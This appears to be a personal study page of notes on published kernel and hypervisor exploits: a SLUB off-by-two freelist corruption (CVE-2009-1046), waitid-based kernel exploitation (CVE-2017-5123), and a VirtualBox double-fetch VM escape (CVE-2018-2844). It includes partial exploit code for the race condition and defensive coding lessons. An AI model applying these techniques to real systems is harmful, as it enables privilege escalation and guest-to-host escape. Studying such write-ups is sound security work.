*Some thoughts and notes about exploitation. Updating...*

<br>

## Attack The Core - CVE-2009-1046: set_selection() off-by-two

Although we can only overflow two bytes on the SLUB allocator, we can gradually open the evil gate for us. In this exploitation, we corrupted data struct in the next free object, made its free list pointer points to a nearby (cause we could corrupt just two bytes) no-align fake object which we can construct the whole free list pointer to a fake object totally constructed by us in user space. BTW, we don't consider the SMAP here.

![](./img/misaligning_slab_by_corrupting_the_free_pointer.png)

This actually reminds me that when we dev, if some structs in data are constant in their lifetime, we shouldn't just make them all writable. Instead, we should force them to be const (Principle of least privilege). Give an example, if the last two bytes of our address are always being zero, we can:

```c
void *p = input();
return p & ~0xFFFF;
// or
void *p = input(); // without least two bytes
return p << 16;
```

<br>


## [Exploiting CVE-2017-5123 with full protections. SMEP, SMAP, and the Chrome Sandbox!](https://salls.github.io/Linux-Kernel-CVE-2017-5123/)

1. Spray payload or victims, which increases the possibility of success, and (brute force) probe are both can be used to against ASLR.

2. Padding, especially padding in the middle or beginning of struct, is Evil, for instance:

```c
struct siginfo {
    int si_signo;
    int si_errno;
    int si_code;
    int padding;   // this remains unchanged by waitid
    int pid;       // process id
    int uid;       // user id
    int status;    // return code
}
```

Since it's easy for us to control the least byte in pid, we can overwrite arbitrary 5 bytes plus 3 zeros (si_code is an unsigned int under 256), thus becoming an 8 bytes address!

On the contrary, if we use padding with union, like:

```c
typedef struct siginfo {
	union {
		__SIGINFO;
		int _si_pad[SI_MAX_SIZE/sizeof(int)];
	};
} __ARCH_SI_ATTRIBUTES siginfo_t;
```

Now the padding space is above all the elements in struct, since controlling the most byte usually more difficult than the least byte, this is safer.

3. When we probe the kernel, we can currently detect the status of the kernel from user space, deciding when we find the victim or result. For example, when we use ret2dir and can't find the offset of it, we can allocate a very large amount of memory in userland. Then try randomly overwriting pages in the kernel’s physmap, while simultaneously checking if the userland page has changed. If we see a change, then we have found a kernel virtual address that corresponds to a userland address and we can write to userland to create our payload in kernel memory.
4. If a region is RW but not X, it doesn't mean we can't corrupt this region to hijack the control flow to the payload, an example is that we can construct a fake object which contains function pointers, then we trigger the path to these pointers.

<br>

## [From Compiler Optimization to Code Execution - VirtualBox VM Escape - CVE-2018-2844](https://www.voidsecurity.in/2018/08/from-compiler-optimization-to-code.html)

One method to trigger race vulnerabilities where the race window is small to brutal trying on different cores until success. For instance, there is a TOCTTOU vulnerability in the code below:

```c
static int vboxVDMACmdExec(PVBOXVDMAHOST pVdma, const uint8_t *pvBuffer, uint32_t cbBuffer) {
 /* pvBuffer is shared memory in VRAM */
        PVBOXVDMACMD pCmd = (PVBOXVDMACMD)pvBuffer;

        switch (pCmd->enmType) {
                case VBOXVDMACMD_TYPE_CHROMIUM_CMD: {
                        ...
                }
                case VBOXVDMACMD_TYPE_DMA_PRESENT_BLT: {
                        ...
                default: {
                         ...
```

Since the variable **is not marked volatile**, GCC optimizations resulted in double fetch from shared VRAM memory. This is what it looks like after optimization:

```assembly
; first fetch happens for cmp
.text:00000000000B957A                 cmp     dword ptr [r12], 0Ah ; switch 11 cases
.text:00000000000B957F                 ja      VBOXVDMACMD_TYPE_DEFAULT ; jumptable 00000000000B9597 default case

; second fetch again for pCmd->enmType from shared memory
.text:00000000000B9585                 mov     eax, [r12]
.text:00000000000B9589                 lea     rbx, vboxVDMACmdExec_JMPS
.text:00000000000B9590                 movsxd  rax, dword ptr [rbx+rax*4]
.text:00000000000B9594                 add     rax, rbx
.text:00000000000B9597                 jmp     rax             ; switch jump
```

So **RAX can be controlled by hacker**. In shellcode we can bound two threads to different cores, and give a brutal test **until the shell code set the shellcode->done**:

```c
// exploit.c
	iopl(3);
	cbVRAM = inl(VBE_DISPI_IOPORT_DATA);
	warnx("[+] VRAM buffer size = 0x%lx", cbVRAM);
	vram = map_phy_address(VRAM_PADDR, cbVRAM);
// ......
	while(1) {
		outl(payload_offset, VGA_PORT_HGSMI_GUEST);             // Racer 1
		if (shellcode->done) exit(EXIT_SUCCESS);
	}
// ......
	pthread_create(&race, NULL, jmp_table_race, &pDmaCmd->enmType); 

void *jmp_table_race(void *gva) {
	uint32_t volatile *vram_gva = (uint32_t *)gva;
	if (set_cpu_affinity(1) != 0) 
		errx(EXIT_FAILURE, "[!] Error setting CPU affinity");
	while(1) {                                                   // Racer 2
		/* points to 0xFEFEFEFF in VBoxDD.so */
		*vram_gva = 0x11EE9;		
		*vram_gva = VBOXVDMACMD_TYPE_CHILD_STATUS_IRQ;
	}
	return NULL;
}

// shellcode.c
void __attribute__((optimize("no-stack-protector"))) shellcode(struct payload *payload) {
// ......
	if (payload->done) return;
	payload->done = 1;
```

